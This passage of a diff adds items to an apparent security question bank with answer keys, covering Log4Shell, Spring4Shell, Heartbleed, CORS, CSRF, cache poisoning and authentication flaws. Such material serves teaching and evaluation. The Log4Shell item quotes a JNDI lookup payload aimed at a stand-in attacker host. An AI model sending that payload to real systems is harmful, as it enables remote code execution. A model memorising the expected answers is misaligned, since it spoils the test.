+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "defensive_mitigation",
+    "expected_sources": [
+      "OWASP Secrets Management Cheat Sheet",
+      "CWE-798"
+    ],
+    "expected_claims": [
+      "Never commit credentials to version control or hardcode in application artifacts",
+      "Utilize dedicated secret managers with fine-grained access policies and automatic rotation"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-050",
+    "question": "Why does using standard string comparison (==) for HMAC tokens introduce timing attacks, and how does constant-time comparison resolve it?",
+    "domain": "SECURE_CODING",
+    "subdomain": "CONSTANT_TIME_COMPARE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Timing Attack",
+      "Side-channel",
+      "Constant-time comparison",
+      "crypto.timingSafeEqual",
+      "Early exit"
+    ],
+    "expected_answer_characteristics": [
+      "Standard comparison terminates immediately upon encountering the first mismatched byte",
+      "Constant-time comparison evaluates all bytes uniformly, eliminating timing side-channels"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-208",
+      "CWE-385"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "code_analysis",
+    "expected_sources": [
+      "CWE-208",
+      "CWE-385"
+    ],
+    "expected_claims": [
+      "Standard comparison terminates immediately upon encountering the first mismatched byte",
+      "Constant-time comparison evaluates all bytes uniformly, eliminating timing side-channels"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-051",
+    "question": "Explain CVE-2021-44228 (Log4Shell): What was the root cause in Log4j's message lookup mechanism and how was JNDI/LDAP leveraged?",
+    "domain": "CVE_ANALYSIS",
+    "subdomain": "CVE-2021-44228",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "CVE-2021-44228",
+      "Log4Shell",
+      "Log4j",
+      "JNDI Lookup",
+      "LDAP Remote Code Execution",
+      "formatMsgNoLookups"
+    ],
+    "expected_answer_characteristics": [
+      "Log4j evaluated JNDI lookups inside log message strings without restriction",
+      "Attackers sent ${jndi:ldap://attacker/a} forcing server to fetch and execute untrusted Java class"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "NVD CVE-2021-44228",
+      "Apache Log4j Security Advisory"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "cve_analysis",
+    "expected_sources": [
+      "NVD CVE-2021-44228",
+      "Apache Log4j Security Advisory"
+    ],
+    "expected_claims": [
+      "Log4j evaluated JNDI lookups inside log message strings without restriction",
+      "Attackers sent ${jndi:ldap://attacker/a} forcing server to fetch and execute untrusted Java class"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-052",
+    "question": "Explain CVE-2022-22965 (Spring4Shell): How did class loader access via Spring parameter binding lead to Tomcat web shell deployment?",
+    "domain": "CVE_ANALYSIS",
+    "subdomain": "CVE-2022-22965",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "CVE-2022-22965",
+      "Spring4Shell",
+      "Spring Framework",
+      "Class Loader Binding",
+      "AccessLogValve",
+      "Tomcat"
+    ],
+    "expected_answer_characteristics": [
+      "Java 9+ module system allowed accessing class.module.classLoader via BeanWrapper",
+      "Manipulating Tomcat AccessLogValve properties wrote arbitrary JSP shells into webroot"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "VMware Spring Advisory",
+      "NVD CVE-2022-22965"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "cve_analysis",
+    "expected_sources": [
+      "VMware Spring Advisory",
+      "NVD CVE-2022-22965"
+    ],
+    "expected_claims": [
+      "Java 9+ module system allowed accessing class.module.classLoader via BeanWrapper",
+      "Manipulating Tomcat AccessLogValve properties wrote arbitrary JSP shells into webroot"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-053",
+    "question": "Explain CVE-2014-0160 (Heartbleed): How did missing bounds checking in OpenSSL's TLS Heartbeat extension leak private memory?",
+    "domain": "CVE_ANALYSIS",
+    "subdomain": "CVE-2014-0160",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "CVE-2014-0160",
+      "Heartbleed",
+      "OpenSSL",
+      "TLS Heartbeat",
+      "Buffer Over-read",
+      "Memory Leak"
+    ],
+    "expected_answer_characteristics": [
+      "Client specified payload length without server validating actual buffer length received",
+      "OpenSSL copied requested length from process memory, leaking private keys and session tokens"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "NVD CVE-2014-0160",
+      "OpenSSL Advisory"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "cve_analysis",
+    "expected_sources": [
+      "NVD CVE-2014-0160",
+      "OpenSSL Advisory"
+    ],
+    "expected_claims": [
+      "Client specified payload length without server validating actual buffer length received",
+      "OpenSSL copied requested length from process memory, leaking private keys and session tokens"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-054",
+    "question": "Explain CVSS v3.1 Base Metrics: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and CIA Impact.",
+    "domain": "CVE_ANALYSIS",
+    "subdomain": "CVSS_V3",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "CVSS v3.1",
+      "Base Metrics",
+      "Attack Vector (AV)",
+      "Attack Complexity (AC)",
+      "Privileges Required (PR)",
+      "User Interaction (UI)",
+      "Scope (S)"
+    ],
+    "expected_answer_characteristics": [
+      "Base metric group reflects intrinsic qualities constant over time and user environments",
+      "Scope indicates whether vulnerability can affect resources beyond security authority of vulnerable component"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "FIRST CVSS v3.1 Specification",
+      "NVD CVSS Guide"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "FIRST CVSS v3.1 Specification",
+      "NVD CVSS Guide"
+    ],
+    "expected_claims": [
+      "Base metric group reflects intrinsic qualities constant over time and user environments",
+      "Scope indicates whether vulnerability can affect resources beyond security authority of vulnerable component"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-055",
+    "question": "Which Windows Event IDs are essential for detecting credential dumping via LSASS and lateral movement using PsExec?",
+    "domain": "SOC_DFIR",
+    "subdomain": "WINDOWS_EVENT_LOGS",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Windows Event Log",
+      "Event ID 4624",
+      "Event ID 4672",
+      "Event ID 7045",
+      "Event ID 4688",
+      "LSASS Process Access",
+      "Sysmon Event ID 10"
+    ],
+    "expected_answer_characteristics": [
+      "Sysmon Event ID 10 flags LSASS handle access with PROCESS_VM_READ permissions",
+      "Event ID 7045 records new service installation characteristic of PsExec execution"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft Security Auditing Documentation",
+      "MITRE ATT&CK T1003.001"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "Microsoft Security Auditing Documentation",
+      "MITRE ATT&CK T1003.001"
+    ],
+    "expected_claims": [
+      "Sysmon Event ID 10 flags LSASS handle access with PROCESS_VM_READ permissions",
+      "Event ID 7045 records new service installation characteristic of PsExec execution"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-056",
+    "question": "Compare Indicators of Compromise (IOC) and Indicators of Attack (IOA) within threat hunting and detection engineering.",
+    "domain": "SOC_DFIR",
+    "subdomain": "IOC_VS_IOA",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "IOC",
+      "IOA",
+      "Threat Hunting",
+      "Hashes",
+      "IP addresses",
+      "Behavioral detection",
+      "Pyramid of Pain"
+    ],
+    "expected_answer_characteristics": [
+      "IOCs are forensic artifacts (hashes, domains) reflecting past activity",
+      "IOAs focus on adversary behavior, intent, and execution tactics in real time"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "David Bianco: The Pyramid of Pain",
+      "SANS DFIR"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "David Bianco: The Pyramid of Pain",
+      "SANS DFIR"
+    ],
+    "expected_claims": [
+      "IOCs are forensic artifacts (hashes, domains) reflecting past activity",
+      "IOAs focus on adversary behavior, intent, and execution tactics in real time"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-057",
+    "question": "What is the systematic methodology for combining passive certificate transparency logs and active DNS brute-forcing for asset discovery?",
+    "domain": "RECONNAISSANCE",
+    "subdomain": "SUBDOMAIN_ENUMERATION",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Subdomain Enumeration",
+      "Certificate Transparency",
+      "crt.sh",
+      "DNS Brute-forcing",
+      "Wildcard DNS Resolution"
+    ],
+    "expected_answer_characteristics": [
+      "Query public CT logs for pre-issued SSL certificates",
+      "Perform active resolution filtering out wildcard DNS response addresses"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-INFO-01",
+      "RFC 6962"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP WSTG-INFO-01",
+      "RFC 6962"
+    ],
+    "expected_claims": [
+      "Query public CT logs for pre-issued SSL certificates",
+      "Perform active resolution filtering out wildcard DNS response addresses"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-058",
+    "question": "How do Negative Controls prevent false positives during automated endpoint discovery and vulnerability scanning?",
+    "domain": "RECONNAISSANCE",
+    "subdomain": "NEGATIVE_CONTROLS",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Negative Controls",
+      "False Positive Elimination",
+      "Baseline Response",
+      "Non-existent Endpoints",
+      "Soft 404"
+    ],
+    "expected_answer_characteristics": [
+      "Send known invalid payloads or paths to establish non-vulnerable baseline behavior",
+      "Disregard responses that match the negative control baseline to eliminate false discoveries"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG",
+      "Milestone Platform Security Invariants"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP WSTG",
+      "Milestone Platform Security Invariants"
+    ],
+    "expected_claims": [
+      "Send known invalid payloads or paths to establish non-vulnerable baseline behavior",
+      "Disregard responses that match the negative control baseline to eliminate false discoveries"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-059",
+    "question": "How can a security researcher safely set up an isolated local container lab to reproduce and study SSRF vulnerabilities without risking external networks?",
+    "domain": "LAB_REPRODUCTION",
+    "subdomain": "CONTAINER_LAB",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Lab Reproduction",
+      "Docker Network Isolation",
+      "Internal Subnet",
+      "Mock Metadata Service",
+      "Negative Control Testing"
+    ],
+    "expected_answer_characteristics": [
+      "Deploy vulnerable web server and target mock service on private bridge network without internet gateway",
+      "Use strict host firewall rules preventing egress to physical local network"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP Lab Guide",
+      "Docker Security Best Practices"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "lab_reproduction",
+    "expected_sources": [
+      "OWASP Lab Guide",
+      "Docker Security Best Practices"
+    ],
+    "expected_claims": [
+      "Deploy vulnerable web server and target mock service on private bridge network without internet gateway",
+      "Use strict host firewall rules preventing egress to physical local network"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-060",
+    "question": "What ethical and operational boundaries distinguish safe proof-of-concept demonstration from disruptive exploitation in authorized penetration tests?",
+    "domain": "LAB_REPRODUCTION",
+    "subdomain": "SAFE_EXPLOITATION_LIMITS",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Rules of Engagement",
+      "Proof of Concept",
+      "Safe Verification",
+      "Denial of Service Prevention",
+      "Data Integrity"
+    ],
+    "expected_answer_characteristics": [
+      "Demonstrate execution via benign non-destructive assertions like whoami or sleep",
+      "Never extract bulk customer PII or execute destructive file deletion"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "PTES (Penetration Testing Execution Standard)",
+      "NIST SP 800-115"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "PTES (Penetration Testing Execution Standard)",
+      "NIST SP 800-115"
+    ],
+    "expected_claims": [
+      "Demonstrate execution via benign non-destructive assertions like whoami or sleep",
+      "Never extract bulk customer PII or execute destructive file deletion"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-061",
+    "question": "How does Access-Control-Allow-Origin: null or unvalidated reflection of the Origin header lead to cross-origin data theft?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "CORS_MISCONFIGURATION",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "CORS",
+      "Access-Control-Allow-Origin",
+      "Access-Control-Allow-Credentials",
+      "Origin: null",
+      "Data Exfiltration"
+    ],
+    "expected_answer_characteristics": [
+      "Reflecting arbitrary Origin with credentials allowed enables malicious websites to read private responses via fetch"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-CONF-07",
+      "CWE-942"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-CONF-07",
+      "CWE-942"
+    ],
+    "expected_claims": [
+      "Reflecting arbitrary Origin with credentials allowed enables malicious websites to read private responses via fetch"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-062",
+    "question": "Explain Clickjacking (UI Redress) attacks and how Content-Security-Policy frame-ancestors replaces legacy X-Frame-Options.",
+    "domain": "WEB_SECURITY",
+    "subdomain": "CLICKJACKING",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Clickjacking",
+      "X-Frame-Options",
+      "Content-Security-Policy",
+      "frame-ancestors",
+      "Iframe embedding"
+    ],
+    "expected_answer_characteristics": [
+      "Frame-ancestors directive provides granular origin control and supersedes single-origin X-Frame-Options"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP Clickjacking Cheat Sheet",
+      "CWE-1021"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "defensive_mitigation",
+    "expected_sources": [
+      "OWASP Clickjacking Cheat Sheet",
+      "CWE-1021"
+    ],
+    "expected_claims": [
+      "Frame-ancestors directive provides granular origin control and supersedes single-origin X-Frame-Options"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-063",
+    "question": "What is the Double Submit Cookie pattern for CSRF mitigation and under what conditions can subdomains compromise it?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "CSRF_TOKENS",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "CSRF",
+      "Double Submit Cookie",
+      "SameSite Cookie",
+      "Subdomain cookie injection",
+      "Cryptographic HMAC"
+    ],
+    "expected_answer_characteristics": [
+      "Server compares request body token with cookie token without server session state",
+      "Attacker controlling insecure sibling subdomain can overwrite parent domain cookies"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
+      "CWE-352"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
+      "CWE-352"
+    ],
+    "expected_claims": [
+      "Server compares request body token with cookie token without server session state",
+      "Attacker controlling insecure sibling subdomain can overwrite parent domain cookies"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-064",
+    "question": "How do JSONP endpoints or script gadgets hosted on CDN allowlists enable Content Security Policy (CSP) bypasses?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "CSP_BYPASS",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "CSP Bypass",
+      "Content Security Policy",
+      "JSONP",
+      "AngularJS gadgets",
+      "CDN allowlisting"
+    ],
+    "expected_answer_characteristics": [
+      "Allowlisting broad CDN domains allows loading outdated scripts containing known DOM execution gadgets"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Google CSP Evaluator",
+      "CWE-79"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "Google CSP Evaluator",
+      "CWE-79"
+    ],
+    "expected_claims": [
+      "Allowlisting broad CDN domains allows loading outdated scripts containing known DOM execution gadgets"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-065",
+    "question": "How does Web Cache Poisoning operate when reverse proxies cache unkeyed input headers like X-Forwarded-Host?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "WEB_CACHE_POISONING",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Web Cache Poisoning",
+      "Unkeyed Headers",
+      "Cache Key",
+      "X-Forwarded-Host",
+      "Reverse Proxy"
+    ],
+    "expected_answer_characteristics": [
+      "Unkeyed headers change HTTP response body without altering the cache key looked up by downstream users"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "PortSwigger Practical Web Cache Poisoning",
+      "CWE-444"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "PortSwigger Practical Web Cache Poisoning",
+      "CWE-444"
+    ],
+    "expected_claims": [
+      "Unkeyed headers change HTTP response body without altering the cache key looked up by downstream users"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-066",
+    "question": "Explain Open Redirect vulnerabilities and how attackers chain them with OAuth authorization flows to steal tokens.",
+    "domain": "WEB_SECURITY",
+    "subdomain": "OPEN_REDIRECT",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Open Redirect",
+      "OAuth 2.0",
+      "redirect_uri",
+      "Token Leakage",
+      "CWE-601"
+    ],
+    "expected_answer_characteristics": [
+      "Unvalidated redirect URLs allow routing victims to attacker sites",
+      "Chaining with permissive OAuth redirect_uri path matching leaks authorization codes"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-CLNT-04",
+      "RFC 6749"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-CLNT-04",
+      "RFC 6749"
+    ],
+    "expected_claims": [
+      "Unvalidated redirect URLs allow routing victims to attacker sites",
+      "Chaining with permissive OAuth redirect_uri path matching leaks authorization codes"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-067",
+    "question": "What is HTTP Parameter Pollution (HPP) and how do different backend technologies (PHP, ASP.NET, Express) parse duplicate parameters?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "HTTP_PARAMETER_POLLUTION",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "HPP",
+      "Parameter Parsing",
+      "ASP.NET comma concatenate",
+      "PHP last parameter",
+      "WAF bypass"
+    ],
+    "expected_answer_characteristics": [
+      "Backends parse duplicate query keys differently (first, last, array, comma concatenation)",
+      "Discrepancy allows splitting injection payloads to bypass WAF pattern matching"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-INPV-04",
+      "CWE-235"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-INPV-04",
+      "CWE-235"
+    ],
+    "expected_claims": [
+      "Backends parse duplicate query keys differently (first, last, array, comma concatenation)",
+      "Discrepancy allows splitting injection payloads to bypass WAF pattern matching"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-068",
+    "question": "What is Cross-Site WebSocket Hijacking (CSWSH) and why does the Same-Origin Policy not apply to WebSocket handshakes?",
+    "domain": "WEB_SECURITY",
+    "subdomain": "WEBSOCKET_SECURITY",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "CSWSH",
+      "WebSockets",
+      "Origin header",
+      "Upgrade request",
+      "Session hijacking"
+    ],
+    "expected_answer_characteristics": [
+      "WebSocket upgrade handshake uses standard HTTP cookies without automatic browser SOP blocking",
+      "Backend must validate Origin header during handshake to prevent cross-site connection initiation"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Christian Schneider CSWSH Research",
+      "CWE-1385"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "Christian Schneider CSWSH Research",
+      "CWE-1385"
+    ],
+    "expected_claims": [
+      "WebSocket upgrade handshake uses standard HTTP cookies without automatic browser SOP blocking",
+      "Backend must validate Origin header during handshake to prevent cross-site connection initiation"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-069",
+    "question": "How does FIDO2/WebAuthn eliminate credential stuffing and phishing by binding cryptographic keys to origin domains?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "PASSKEY_WEBAUTHN",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "WebAuthn",
+      "FIDO2",
+      "Passkeys",
+      "Public Key Credential",
+      "Origin Binding",
+      "Phishing Resistance"
+    ],
+    "expected_answer_characteristics": [
+      "Authenticator generates key pair scoped strictly to the RP ID (domain)",
+      "Phishing sites with different domains cannot prompt signing of challenge for legitimate RP ID"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "W3C WebAuthn Specification",
+      "FIDO Alliance"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "W3C WebAuthn Specification",
+      "FIDO Alliance"
+    ],
+    "expected_claims": [
+      "Authenticator generates key pair scoped strictly to the RP ID (domain)",
+      "Phishing sites with different domains cannot prompt signing of challenge for legitimate RP ID"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-070",
+    "question": "What are critical security flaws to test for in password reset workflows including Host header poisoning and token entropy?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "PASSWORD_RESET",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Password Reset",
+      "Host Header Injection",
+      "Token Entropy",
+      "Token Leakage via Referer",
+      "CWE-640"
+    ],
+    "expected_answer_characteristics": [
+      "Poisoning Host header causes reset email link to point to attacker server",
+      "Predictable or reusable tokens allow account takeover"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP Forgot Password Cheat Sheet",
+      "CWE-640"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP Forgot Password Cheat Sheet",
+      "CWE-640"
+    ],
+    "expected_claims": [
+      "Poisoning Host header causes reset email link to point to attacker server",
+      "Predictable or reusable tokens allow account takeover"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-071",
+    "question": "What is the distinction between an OAuth 2.0 Access Token and an OpenID Connect (OIDC) ID Token?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "OIDC_ID_TOKEN",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "OIDC",
+      "OAuth 2.0",
+      "Access Token",
+      "ID Token",
+      "Userinfo",
+      "Identity vs Authorization"
+    ],
+    "expected_answer_characteristics": [
+      "ID Token is a JWT meant for client app containing identity assertions",
+      "Access Token is an opaque or structured credential meant for resource server API calls"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OpenID Connect Core 1.0",
+      "RFC 6749"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "protocol_analysis",
+    "expected_sources": [
+      "OpenID Connect Core 1.0",
+      "RFC 6749"
+    ],
+    "expected_claims": [
+      "ID Token is a JWT meant for client app containing identity assertions",
+      "Access Token is an opaque or structured credential meant for resource server API calls"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-072",
+    "question": "Why is revoking stateless JWT sessions challenging and what architectural patterns (blocklists, token versioning) resolve it?",
+    "domain": "AUTHENTICATION",
+    "subdomain": "SESSION_REVOCATION",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "JWT Revocation",
+      "Stateless Tokens",
+      "Token Blacklist",
+      "Redis TTL",
+      "Token Version Counter"
+    ],
+    "expected_answer_characteristics": [
+      "Stateless JWTs remain cryptographically valid until expiration without database check",
+      "Use centralized revocation blocklist or token version integer in user record to revoke"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "RFC 8725",
+      "OWASP Session Management Cheat Sheet"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "RFC 8725",
+      "OWASP Session Management Cheat Sheet"
+    ],
+    "expected_claims": [
+      "Stateless JWTs remain cryptographically valid until expiration without database check",
+      "Use centralized revocation blocklist or token version integer in user record to revoke"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-073",
+    "question": "Compare Role-Based Access Control (RBAC) and Attribute-Based Access Control (ABAC) in enterprise access architectures.",
+    "domain": "AUTHORIZATION",
+    "subdomain": "ABAC_VS_RBAC",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "RBAC",
+      "ABAC",
+      "Roles",
+      "Attributes",
+      "Policy Enforcement Point",
+      "NIST SP 800-162"
+    ],
+    "expected_answer_characteristics": [
+      "RBAC assigns permissions based on static role memberships",
+      "ABAC evaluates dynamic attributes of subject, resource, action, and environment context"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "NIST SP 800-162",
+      "CWE-285"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "NIST SP 800-162",
+      "CWE-285"
+    ],
+    "expected_claims": [
+      "RBAC assigns permissions based on static role memberships",
+      "ABAC evaluates dynamic attributes of subject, resource, action, and environment context"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-074",
+    "question": "How do framework path-matching discrepancies (e.g. Spring /admin/* vs /admin) lead to security filter bypasses?",
+    "domain": "AUTHORIZATION",
+    "subdomain": "PATH_AUTHORIZATION_BYPASS",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Path Matching",
+      "Spring Security",
+      "AntMatcher",
+      "RegexMatcher",
+      "Trailing slash",
+      "URL normalization"
+    ],
+    "expected_answer_characteristics": [
+      "Discrepancies between reverse proxy, security filter, and servlet routing cause filters to skip authorization checks"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Spring Security Reference",
+      "CWE-285"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
